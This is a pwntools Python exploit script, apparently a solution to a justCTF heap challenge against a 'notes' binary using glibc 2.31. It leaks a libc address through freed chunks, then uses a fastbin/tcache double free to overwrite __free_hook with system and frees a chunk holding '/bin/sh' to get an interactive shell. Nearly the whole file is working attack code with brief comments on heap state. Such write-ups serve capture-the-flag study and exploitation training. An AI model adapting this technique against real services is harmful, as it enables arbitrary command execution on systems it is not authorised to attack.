#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './notes'
context.terminal = ['tmux', 'new-window']
argv = []
env = {'LD_PRELOAD':'./libc-2.31.so'}
libc = ELF('./libc-2.31.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

cnt = -1
def add(size, content):
    global cnt
    io.sendlineafter("> ", "1")
    io.sendlineafter("size: ", str(size))
    io.sendlineafter("content: ", content)
    cnt += 1
    return cnt

def delete(idx):
    io.sendlineafter("> ", "2")
    io.sendlineafter("id: ", str(idx))

def view(idx):
    io.sendlineafter("> ", "3")
    io.sendlineafter("id: ", str(idx))

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start(argv, env=env)

io.sendlineafter("10): ", str(-1))

ids = []
for i in range(0x8):
    ids.append(add(0x100, "A"))

add(0x10, "D")

for i in range(len(ids)):
    delete(ids[i])

view(ids[-1])

libc_leak = io.recvline()[:6]
libc_leak = u64(libc_leak.ljust(0x8, b'\x00'))

libc.address = libc_leak - 0x1ecbe0
print(hex(libc.address))

ids = []
for i in range(0x9):
    ids.append(add(0x20, "A"))

for i in range(0x7):
    delete(ids[i])

delete(ids[-1])
delete(ids[-2])
delete(ids[-1])

for i in range(0x7):
    add(0x20, "A")

'''
fastbins look like this:

0x30: 0x55d990c07bc0 —▸ 0x55d990c07b90 ◂— 0x55d990c07bc0

- allocating a 0x20 chunk will return 0x55d990c07bc0
- rest will land in tcache 
  - if corresponding fast bin exists, try and find a chunk from there (and also opportunistically prefill the tcache with entries from the fast bin).
- when chunk gets returned to us the double freed one is already in tcache so we can overwrite next pointer

'''

a = add(0x20, p64(libc.sym['__free_hook']))

add(0x20, "A")
win = add(0x20, "/bin/sh\x00")
add(0x20, p64(libc.sym['system']))

delete(win)


io.interactive()

# justCTF{_dumpl1ngs!!1!}

